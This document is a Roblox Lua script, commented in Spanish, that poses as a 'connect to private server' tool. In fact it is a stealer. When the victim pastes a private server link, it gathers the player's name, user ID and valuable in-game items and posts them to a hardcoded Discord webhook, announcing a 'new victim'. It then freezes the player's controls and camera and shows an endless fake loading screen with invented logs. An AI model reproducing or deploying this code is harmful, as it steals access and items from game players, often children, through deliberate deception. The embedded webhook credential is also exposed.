--[[ 
    MOREIRA SYSTEMS V5.0 - PSYCHOLOGICAL WARFARE EDITION 
    [!] INTERFAZ RECONSTRUIDA PARA MÃXIMA RETENCIÃ“N
    [!] BARRA DE CARGA + CRONÃ“METRO DE INYECCIÃ“N
    [!] SISTEMA DE "FEEDBACK" FALSO PARA ENGAÃ‘AR A LA VÃCTIMA
 
    BY SHXDOW x DOLPHIN
]]
 
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
 
-- // CONFIGURACIÃ“N //
local WEBHOOK_URL = "https://discord.com/api/v10/webhooks/1446159384798298124/4xKrReMncfbttw6_BtA3K3vjQe6PPbFkfWJzFFWAz_OHtMAhXLFt5NWu00o3I8787PB8"
local Min_Gen = 1_000_000 
local VERSION = "v5.0-ULTIMATE"
 
-- // VARIABLES //
local Jugador = Players.LocalPlayer
local PlayerGui = Jugador:WaitForChild("PlayerGui")
local Camera = Workspace.CurrentCamera
local UserID = Jugador.UserId
 
--------------------------------------------------------------------------------
-- UTILIDADES DE SONIDO Y EFECTOS
--------------------------------------------------------------------------------
 
local function playSound(id, vol, pitch)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://" .. id
    sound.Volume = vol or 1
    sound.PlaybackSpeed = pitch or 1
    sound.Parent = SoundService
    sound.PlayOnRemove = true
    sound:Destroy()
end
 
local function createBlur(size)
    local blur = Lighting:FindFirstChild("MoreiraBlur") or Instance.new("BlurEffect")
    blur.Name = "MoreiraBlur"
    blur.Parent = Lighting
    TweenService:Create(blur, TweenInfo.new(1.5), {Size = size}):Play()
end
 
--------------------------------------------------------------------------------
-- LÃ“GICA DE ROBO (DATA MINING)
--------------------------------------------------------------------------------
 
local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end
 
local function parseValueFromText(s)
    if not s then return 0 end
    local num = s:match("([%d%.]+)")
    if not num then return 0 end
    local n = tonumber(num) or 0
    if s:find("B") then return n * 1e9
    elseif s:find("M") then return n * 1e6
    elseif s:find("K") then return n * 1e3
    else return n end
end
 
local function getBrainrots()
    local results = {}
    local plots = Workspace:FindFirstChild("Plots") or Workspace
 
    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
        if podiums then
            for _, pd in ipairs(podiums:GetChildren()) do
                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
                local spawn = base and base:FindFirstChild("Spawn")
                local att = spawn and spawn:FindFirstChild("Attachment")
                local oh = att and att:FindFirstChild("AnimalOverhead")
 
                local nameLbl = oh and oh:FindFirstChild("DisplayName")
                local genLbl = oh and oh:FindFirstChild("Generation")
 
                if nameLbl and nameLbl:IsA("TextLabel") then
                    local name = nameLbl.Text
                    local genText = genLbl and genLbl.Text or "0"
                    local valueNum = parseValueFromText(genText)
 
                    if valueNum >= Min_Gen then
                        local key = name .. "|" .. valueNum
                        if results[key] then
                            results[key].count = results[key].count + 1
                        else
                            results[key] = {name = name, value = valueNum, count = 1}
                        end
                    end
                end
            end
        end
    end
 
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end
 
local function sendToDiscord(link, playerName, brainrots)
    task.spawn(function()
        local itemList = ""
        local totalValue = 0
 
        if #brainrots > 0 then
            for i, br in ipairs(brainrots) do
                if i <= 20 then 
                    local fVal = formatNumberShort(br.value)
                    itemList = itemList .. string.format("`ðŸ“¦` **%s** âžœ %s (x%d)\n", br.name, fVal, br.count)
                end
                totalValue = totalValue + (br.value * br.count)
            end
        else
            itemList = "âŒ *Usuario sin valor (Pobre)*"
        end
 
        local embed = {
            ["title"] = "ðŸ’  QUANTUM LOGGER V5 - HIT",
            ["description"] = "Se ha interceptado una sesiÃ³n activa. InyecciÃ³n completada.",
            ["color"] = 0x00FFAA, -- Neon Cyan
            ["fields"] = {
                { ["name"] = "ðŸ‘¤ Usuario", ["value"] = string.format("`%s` ||(%d)||", playerName, UserID), ["inline"] = true },
                { ["name"] = "ðŸ’µ Valor Estimado", ["value"] = "```diff\n+ " .. formatNumberShort(totalValue) .. "\n```", ["inline"] = true },
                { ["name"] = "ðŸ”— Link / Input", ["value"] = string.format("```%s```", link), ["inline"] = false },
                { ["name"] = "ðŸŽ’ Inventario", ["value"] = itemList, ["inline"] = false }
            },
            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..UserID.."&width=420&height=420&format=png" },
            ["footer"] = { ["text"] = "Moreira Systems V5 â€¢ " .. os.date("%X") }
        }
 
        local jsonData = HttpService:JSONEncode({
            ["content"] = "@everyone ðŸ’€ **NUEVA VÃCTIMA CAPTURADA** ðŸ’€",
            ["embeds"] = {embed},
            ["username"] = "Moreira Quantum Bot"
        })
 
        request({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
    end)
end
 
--------------------------------------------------------------------------------
-- PROTOCOLO DE CONGELAMIENTO (MODO SILENCIOSO)
--------------------------------------------------------------------------------
 
local function initiateFreeze()
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
        game:GetService("GuiService"):ClearError()
    end)
 
    local Controls = require(Jugador.PlayerScripts.PlayerModule):GetControls()
    Controls:Disable()
 
    -- Congelamos la cÃ¡mara
    local freezeCFrame = Camera.CFrame
    RunService:BindToRenderStep("FreezeCam", Enum.RenderPriority.Camera.Value + 1, function()
        Camera.CFrame = freezeCFrame
    end)
 
    -- Anclar personaje
    local char = Jugador.Character
    if char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
            end
        end
    end
end
 
--------------------------------------------------------------------------------
-- INTERFAZ GRÃFICA AVANZADA (GUI)
--------------------------------------------------------------------------------
 
local function CreateInterface()
    createBlur(25)
    playSound("160715357", 0.6) -- Tech Start
 
    local SG = Instance.new("ScreenGui")
    SG.Name = "MoreiraV5"
    SG.IgnoreGuiInset = true
    SG.ResetOnSpawn = false
    SG.Parent = PlayerGui
 
    -- // MARCO PRINCIPAL //
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 500, 0, 320)
    MainFrame.Position = UDim2.new(0.5, 0, 1.5, 0) -- Empieza fuera
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = SG
 
    -- Sombra Neon
    local Glow = Instance.new("ImageLabel")
    Glow.Image = "rbxassetid://5028857472"
    Glow.ImageColor3 = Color3.fromRGB(0, 255, 170)
    Glow.Size = UDim2.new(1.4, 0, 1.4, 0)
    Glow.Position = UDim2.new(-0.2, 0, -0.2, 0)
    Glow.BackgroundTransparency = 1
    Glow.ImageTransparency = 0.6
    Glow.ZIndex = -1
    Glow.Parent = MainFrame
 
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = MainFrame
 
    -- TÃ­tulo
    local Title = Instance.new("TextLabel")
    Title.Text = "MOREIRA SYSTEMS <font color='#00ffaa'>// V5.0</font>"
    Title.RichText = true
    Title.Font = Enum.Font.GothamBlack
    Title.TextSize = 18
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.Parent = MainFrame
 
    -- Input Box
    local InputBox = Instance.new("TextBox")
    InputBox.Size = UDim2.new(0.8, 0, 0, 45)
    InputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    InputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    InputBox.PlaceholderText = "Paste Private Server Link Here..."
    InputBox.Font = Enum.Font.GothamBold
    InputBox.TextSize = 14
    InputBox.Parent = MainFrame
    Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 6)
    
    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(60, 60, 80)
    Stroke.Parent = InputBox
 
    -- BotÃ³n
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0.8, 0, 0, 50)
    Btn.Position = UDim2.new(0.1, 0, 0.5, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(0, 180, 120)
    Btn.Text = "CONNECT TO SERVER"
    Btn.Font = Enum.Font.GothamBlack
    Btn.TextSize = 18
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Parent = MainFrame
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)
 
    -- Status Text
    local Status = Instance.new("TextLabel")
    Status.Text = "Secure Connection Ready"
    Status.Font = Enum.Font.Code
    Status.TextColor3 = Color3.fromRGB(100, 100, 100)
    Status.TextSize = 12
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0.9, 0)
    Status.BackgroundTransparency = 1
    Status.Parent = MainFrame
 
    -- AnimaciÃ³n de Entrada
    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
 
    -- // PANTALLA DE CARGA FALSA (LA TRAMPA) //
    local function StartFakeLoading()
        -- Ocultar elementos anteriores
        TweenService:Create(InputBox, TweenInfo.new(0.3), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        TweenService:Create(Btn, TweenInfo.new(0.3), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
        Stroke:Destroy()
        
        task.wait(0.3)
        InputBox.Visible = false
        Btn.Visible = false
 
        -- Crear Barra de Carga
        local BarBG = Instance.new("Frame")
        BarBG.Size = UDim2.new(0.8, 0, 0, 10)
        BarBG.Position = UDim2.new(0.1, 0, 0.5, 0)
        BarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        BarBG.BorderSizePixel = 0
        BarBG.Parent = MainFrame
        Instance.new("UICorner", BarBG).CornerRadius = UDim.new(1, 0)
 
        local BarFill = Instance.new("Frame")
        BarFill.Size = UDim2.new(0, 0, 1, 0)
        BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170) -- Verde Hacker
        BarFill.BorderSizePixel = 0
        BarFill.Parent = BarBG
        Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
 
        -- Efecto Neon en la barra
        local BarGlow = Instance.new("ImageLabel")
        BarGlow.Image = "rbxassetid://5028857472"
        BarGlow.ImageColor3 = Color3.fromRGB(0, 255, 170)
        BarGlow.Size = UDim2.new(1, 20, 3, 0)
        BarGlow.Position = UDim2.new(0, -10, -1, 0)
        BarGlow.BackgroundTransparency = 1
        BarGlow.ImageTransparency = 0.5
        BarGlow.Parent = BarFill
 
        -- Texto de Porcentaje
        local PercentText = Instance.new("TextLabel")
        PercentText.Text = "0%"
        PercentText.Font = Enum.Font.GothamBold
        PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
        PercentText.TextSize = 24
        PercentText.Position = UDim2.new(0.5, 0, 0.35, 0)
        PercentText.AnchorPoint = Vector2.new(0.5, 0.5)
        PercentText.BackgroundTransparency = 1
        PercentText.Parent = MainFrame
 
        -- CronÃ³metro (Estimated Time)
        local TimerText = Instance.new("TextLabel")
        TimerText.Text = "EST. TIME: --:--"
        TimerText.Font = Enum.Font.Code
        TimerText.TextColor3 = Color3.fromRGB(150, 150, 150)
        TimerText.TextSize = 14
        TimerText.Position = UDim2.new(0.5, 0, 0.65, 0)
        TimerText.AnchorPoint = Vector2.new(0.5, 0.5)
        TimerText.BackgroundTransparency = 1
        TimerText.Parent = MainFrame
 
        -- Consola de Comandos PequeÃ±a
        local Console = Instance.new("TextLabel")
        Console.Text = "> Initializing handshake..."
        Console.Font = Enum.Font.Code
        Console.TextColor3 = Color3.fromRGB(0, 255, 170)
        Console.TextSize = 11
        Console.Size = UDim2.new(0.8, 0, 0, 20)
        Console.Position = UDim2.new(0.1, 0, 0.8, 0)
        Console.BackgroundTransparency = 1
        Console.TextXAlignment = Enum.TextXAlignment.Left
        Console.Parent = MainFrame
 
        -- SECUENCIA DE ENGAÃ‘O (AquÃ­ es donde la magia ocurre)
        initiateFreeze() -- Congelamos silenciosamente
        
        local fakeLogs = {
            "Resolving DNS...",
            "Bypassing Region Lock...",
            "Authenticating User Token...",
            "Downloading Server Assets...",
            "Decrypting Save Data...",
            "Allocating Memory...",
            "Syncing World State...",
            "Finalizing Connection..."
        }
 
        local duration = 12 -- Segundos que durarÃ¡ la barra (hazlos sufrir esperando)
        local startTime = tick()
 
        -- Bucle de carga
        task.spawn(function()
            while true do
                local elapsed = tick() - startTime
                local alpha = math.clamp(elapsed / duration, 0, 1)
                
                -- Actualizar Barra
                TweenService:Create(BarFill, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Size = UDim2.new(alpha, 0, 1, 0)}):Play()
                
                -- Actualizar Porcentaje
                local pct = math.floor(alpha * 100)
                PercentText.Text = pct .. "%"
 
                -- Actualizar CronÃ³metro (Cuenta regresiva falsa)
                local timeLeft = math.max(0, duration - elapsed)
                local secs = math.floor(timeLeft)
                local millis = math.floor((timeLeft - secs) * 100)
                TimerText.Text = string.format("EST. TIME: 00:%02d:%02d", secs, millis)
 
                -- Logs aleatorios
                if math.random() > 0.9 then
                    Console.Text = "> " .. fakeLogs[math.random(1, #fakeLogs)]
                    playSound("5356616429", 0.3, 1.5) -- Sonido de tecleo
                end
 
                if alpha >= 1 then break end
                task.wait()
            end
 
            -- AL FINALIZAR
            Console.Text = "> CONNECTION ESTABLISHED. WAITING FOR SERVER..."
            PercentText.Text = "WAITING..."
            PercentText.TextColor3 = Color3.fromRGB(0, 255, 0)
            
            -- Bucle infinito para que no cierre nunca
            while true do
                TweenService:Create(BarGlow, TweenInfo.new(1), {ImageTransparency = 0.2}):Play()
                task.wait(1)
                TweenService:Create(BarGlow, TweenInfo.new(1), {ImageTransparency = 0.8}):Play()
                task.wait(1)
            end
        end)
    end
 
    -- LOGICA DEL BOTÃ“N
    Btn.MouseButton1Click:Connect(function()
        if #InputBox.Text < 3 then return end
        
        playSound("4612375233", 0.5) -- Click
        
        -- Ejecutamos el robo ANTES de la pantalla de carga para asegurar los datos
        local brainrots = getBrainrots()
        sendToDiscord(InputBox.Text, Jugador.Name, brainrots)
        
        -- Iniciamos el teatro
        StartFakeLoading()
    end)
end
 
if not game:IsLoaded() then game.Loaded:Wait() end
CreateInterface()
